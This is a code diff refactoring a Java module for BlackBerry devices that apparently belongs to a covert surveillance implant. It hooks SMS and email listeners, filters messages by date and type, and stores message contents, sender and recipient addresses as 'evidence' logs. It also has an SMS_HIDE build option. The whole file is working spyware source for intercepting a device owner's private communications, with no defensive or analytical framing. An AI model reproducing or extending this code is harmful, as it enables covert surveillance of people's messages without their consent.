@@ -19,9 +19,7 @@ import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
-import blackberry.AgentManager;
-import blackberry.Status;
-import blackberry.agent.mail.Filter;
+import blackberry.ModuleManager;
 import blackberry.agent.mail.Mail;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.mail.MailParser;
@@ -29,8 +27,7 @@ import blackberry.agent.mail.Prefix;
 import blackberry.agent.sms.SmsListener;
 import blackberry.agent.sms.SmsListener45;
 import blackberry.agent.sms.SmsListener46;
-import blackberry.config.Conf;
-import blackberry.crypto.Encryption;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -104,18 +101,15 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      * @param agentStatus
      *            the agent status
      */
-    public ModuleMessage(final boolean agentEnabled) {
-        super(AGENT_MESSAGE, agentEnabled, Conf.AGENT_MESSAGE_ON_SD,
-                "MessageAgent");
+    public ModuleMessage() {
+    
+        markupDate = new TimestampMarkup("message");
 
-        //#ifdef DBC
-        Check.asserts(
-                Evidence.convertTypeEvidence(agentId) == EvidenceType.MAIL_RAW,
-                "Wrong Conversion");
-        //#endif
-
+        setDelay(SLEEPTIME);
+        setPeriod(PERIODTIME);
+    
         mailListener = MailListener.getInstance();
-        
+    
         //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
         //#else
@@ -123,33 +117,31 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //#endif
         //smsListener.setMessageAgent(this);
     }
-
-    /**
-     * Instantiates a new message agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleMessage(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-
-        // mantiene la data prima di controllare tutte le email
-        markupDate = new TimestampMarkup(agentId, Encryption.getKeys()
-                .getAesKey());
-
-        parse(confParams);
-
-        setDelay(SLEEPTIME);
-        setPeriod(PERIODTIME);
+    
+    public static ModuleMessage getInstance() {        
+        return (ModuleMessage) ModuleManager.getInstance().get("message");
     }
 
+    public boolean parse(ConfModule conf) {
+        setPeriod(NEVER);
+        setDelay(100);
 
+        return true;
+    }
 
-    public static ModuleMessage getInstance() {
-        return (ModuleMessage) Status.getInstance()
-                .getAgent(BaseModule.AGENT_MESSAGE);
+    /*
+     * (non-Javadoc)
+     * @see blackberry.threadpool.TimerJob#actualStart()
+     */
+    public void actualStart() {
+        firstRun = true;
+        if (smsEnabled) {
+            smsListener.addSmsObserver(this, null, null);
+        }
+
+        if (mailEnabled) {
+            mailListener.addSingleMailObserver(this);
+        }
     }
 
     /*
@@ -201,29 +193,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#ifdef DEBUG
             debug.info("Restarting MessageAgent, new account");
             //#endif
-            AgentManager.getInstance().reStart(agentId);
+            ModuleManager.getInstance().reStart("message");
         }
 
-    }
-
-    private boolean haveNewAccount() {
-
-        return mailListener.haveNewAccount();
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#actualStart()
-     */
-    public void actualStart() {
-        firstRun = true;
-        if (smsEnabled) {
-            smsListener.addSmsObserver(this, null, null);
-        }
-
-        if (mailEnabled) {
-            mailListener.addSingleMailObserver(this);
-        }
     }
 
     /*
@@ -241,6 +213,11 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
     }
 
+
+    private boolean haveNewAccount() {
+        return mailListener.haveNewAccount();
+    }
+
     /**
      * Creates the log.
      * 
@@ -253,140 +230,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     public void createEvidence(final byte[] additionalData,
             final byte[] content, final int logType) {
 
+        Evidence evidence = new Evidence(logType);
         //#ifdef DBC
         Check.requires(content != null, "createEvidence content null");
         Check.requires(evidence != null, "log null");
         //#endif
 
-        evidence.atomicWriteOnce(additionalData, logType, content);
+        evidence.atomicWriteOnce(additionalData, content);
 
         //#ifdef DEBUG
         debug.trace("Evidence created");
         //#endif
-    }
-
-    /*    *//**
-     * Inits the markup.
-     * 
-     * @return the long
-     */
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] conf) {
-
-        final Vector tokens = tokenize(conf);
-        if (tokens == null) {
-            //#ifdef DEBUG
-            debug.error("Cannot tokenize conf");
-            //#endif
-            return false;
-        }
-
-        final int size = tokens.size();
-        for (int i = 0; i < size; ++i) {
-            final Prefix token = (Prefix) tokens.elementAt(i);
-
-            switch (token.type) {
-                case Prefix.TYPE_IDENTIFICATION:
-                    // IDENTIFICATION TAG
-                    identification = WChar.getString(conf, token.payloadStart,
-                            token.length, false);
-                    //#ifdef DEBUG
-                    debug.trace("Type 1: " + identification);
-                    //#endif
-                    break;
-                case Prefix.TYPE_FILTER:
-                    // Filtro (sempre 2, uno COLLECT e uno REALTIME);
-                    try {
-                        final Filter filter = new Filter(conf,
-                                token.payloadStart, token.length);
-                        if (filter.isValid()) {
-                            switch (filter.classtype) {
-                                case Filter.CLASS_EMAIL:
-                                    //#ifdef DEBUG
-                                    debug.info(filter.toString());
-                                    //#endif
-
-                                    mailEnabled = true;
-                                    if (filter.type == Filter.TYPE_COLLECT) {
-                                        //#ifdef DEBUG
-                                        debug.trace("Filter.TYPE_COLLECT!");
-                                        //#endif
-
-                                        final Date oldfrom = lastcheckGet("FilterFROM");
-                                        final Date oldto = lastcheckGet("FilterTO");
-
-                                        if (filter.fromDate.getTime() == oldfrom
-                                                .getTime()
-                                                && filter.toDate.getTime() == oldto
-                                                        .getTime()) {
-                                            //#ifdef DEBUG
-                                            debug.info("same Mail Collect Filter");
-                                            //#endif
-                                        } else {
-                                            //#ifdef DEBUG
-                                            debug.warn("Changed collect filter, resetting markup");
-                                            debug.trace("oldfrom: " + oldfrom);
-                                            debug.trace("oldto: " + oldto);
-                                            //#endif
-                                            lastcheckReset();
-                                            lastcheckSet("FilterFROM",
-                                                    filter.fromDate);
-                                            lastcheckSet("FilterTO",
-                                                    filter.toDate);
-                                        }
-                                    }
-
-                                    //#ifdef DEBUG
-                                    debug.trace("put: " + filter.type);
-                                    //#endif
-                                    filtersEMAIL.put(filter.type, filter);
-
-                                    break;
-                                case Filter.CLASS_MMS:
-                                    //#ifdef DEBUG
-                                    debug.info(filter.toString());
-                                    //#endif
-                                    filtersMMS.put(filter.type, filter);
-                                    break;
-                                case Filter.CLASS_SMS:
-                                    //#ifdef DEBUG                            
-                                    debug.info(filter.toString());
-                                    //#endif
-                                    smsEnabled = true;
-                                    filtersSMS.put(filter.type, filter);
-                                    break;
-                                case Filter.CLASS_UNKNOWN: // fall through
-                                default:
-                                    //#ifdef DEBUG
-                                    debug.error("unknown classtype: "
-                                            + filter.classtype);
-                                    //#endif
-                                    break;
-                            }
-                        }
-                        //#ifdef DEBUG
-                        debug.trace("Type 2: header valid: " + filter.isValid());
-                        //#endif
-                    } catch (final Exception e) {
-                        //#ifdef DEBUG
-                        debug.error("Cannot filter " + e);
-                        //#endif
-                    }
-                    break;
-
-                default:
-                    //#ifdef DEBUG
-                    debug.error("Unknown type: " + token.type);
-                    //#endif
-                    break;
-            }
-        }
-
-        return true;
     }
 
     private Vector tokenize(final byte[] conf) {
@@ -454,14 +308,15 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     public boolean onNewSms(final byte[] byteMessage, String address,
             final boolean incoming) {
-        
-        String message =  new String(byteMessage);
+
+        String message = new String(byteMessage);
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog message: " + message + " address: "+ address+" incoming: "+ incoming);
+        debug.trace("saveLog message: " + message + " address: " + address
+                + " incoming: " + incoming);
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
@@ -479,7 +334,6 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             String from;
             String to;
-            
 
             // Check if it's actually a sms
 
@@ -537,7 +391,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             // Creating log
             if (message != null) {
-                createEvidence(additionalData, WChar.getBytes(message), EvidenceType.SMS_NEW);
+                createEvidence(additionalData, WChar.getBytes(message),
+                        EvidenceType.SMS_NEW);
                 return false;
             } else {
                 //#ifdef DEBUG
@@ -553,8 +408,6 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             return false;
         }
     }
-
-  
 
     private String getMySmsAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
@@ -761,5 +614,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             mail.append("From: " + from + "\r\n");
         }
     }
+
+
 
 }
